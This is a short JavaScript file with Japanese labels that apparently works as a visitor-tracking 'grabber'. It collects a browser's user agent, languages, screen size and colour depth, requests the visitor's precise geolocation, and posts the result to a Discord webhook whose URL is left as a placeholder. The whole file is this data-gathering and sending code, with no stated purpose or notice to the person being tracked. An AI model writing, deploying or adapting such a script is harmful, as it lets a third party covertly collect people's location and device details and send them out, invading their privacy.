const WEBHOOK_URL = "ここにWebhookのURL";

function sendToDiscord(data) {
  fetch(WEBHOOK_URL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      content: "```" + data + "```"
    })
  });
}

function collectInfo() {
  let text = "";

  const now = new Date();
  text += `取得コード: ${Math.floor(Math.random() * 9000000)}\n`;
  text += `取得時間: ${now.toLocaleString("ja-JP")}\n\n`;

  text += `UserAgent: ${navigator.userAgent}\n`;
  text += `対応言語: ${navigator.languages.join(",")}\n`;
  text += `ブラウザの言語: ${navigator.language}\n`;
  text += `ブラウザの正式名称: ${navigator.appName}\n\n`;

  text += `ディスプレイ: ${screen.width}px/${screen.height}px\n`;
  text += `ディスプレイの色彩: ${screen.colorDepth}ビット\n\n`;

  // 位置情報
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        text += `位置情報:\n`;
        text += `緯度: ${pos.coords.latitude}\n`;
        text += `経度: ${pos.coords.longitude}\n`;
        text += `精度: ±${pos.coords.accuracy}m\n`;

        sendToDiscord(text);
      },
      () => {
        text += `位置情報: 取得中に拒否 / タブが閉じられました。\n`;
        sendToDiscord(text);
      }
    );
  } else {
    text += `位置情報: 非対応ブラウザ\n`;
    sendToDiscord(text);
  }
}
